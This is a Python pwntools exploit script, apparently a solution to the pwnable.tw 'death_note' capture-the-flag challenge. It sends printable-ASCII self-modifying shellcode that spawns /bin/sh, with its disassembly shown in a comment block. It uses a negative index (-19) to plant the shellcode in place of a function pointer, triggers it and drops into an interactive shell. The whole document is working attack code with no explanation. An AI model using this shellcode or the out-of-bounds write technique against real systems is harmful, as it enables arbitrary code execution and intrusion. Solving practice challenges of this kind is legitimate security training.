from pwn import *
from hexdump import *

s = remote('chall.pwnable.tw',10201)
#s = process('/root/death_note') 
shellcode = "\x6A\x7E\x58\x40\x40\x59\x59\x31\x41\x2E\x34\x4F\x31\x41\x2F\x6A\x20\x58\x34\x20\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x54\x5B\x50\x53\x54\x59\x50\x5A\x6A\x20\x58\x34\x2B\x4F\x4F\x4D\x4F"

"""
0:  6a 7e                   push   0x7e
2:  58                      pop    eax
3:  40                      inc    eax
4:  40                      inc    eax
5:  59                      pop    ecx
6:  59                      pop    ecx
7:  31 41 2e                xor    DWORD PTR [ecx+0x2e],eax
a:  34 4f                   xor    al,0x4f
c:  31 41 2f                xor    DWORD PTR [ecx+0x2f],eax
f:  6a 20                   push   0x20
11: 58                      pop    eax
12: 34 20                   xor    al,0x20
14: 50                      push   eax
15: 68 2f 2f 73 68          push   0x68732f2f
1a: 68 2f 62 69 6e          push   0x6e69622f
1f: 54                      push   esp
20: 5b                      pop    ebx
21: 50                      push   eax
22: 53                      push   ebx
23: 54                      push   esp
24: 59                      pop    ecx
25: 50                      push   eax
26: 5a                      pop    edx
27: 6a 20                   push   0x20
29: 58                      pop    eax
2a: 34 2b                   xor    al,0x2b
2c: 4f                      dec    edi
2d: 4f                      dec    edi
2e: 4d                      dec    ebp
2f: 4f                      dec    edi
"""

s.recvuntil("Your choice :")
s.sendline("1")

s.recv(1024)
s.sendline("-19")
s.recv(1024)
s.sendline(shellcode)
s.recvuntil("Your choice :")
s.sendline("3")
s.recv(1024)
s.sendline("-19")
s.interactive()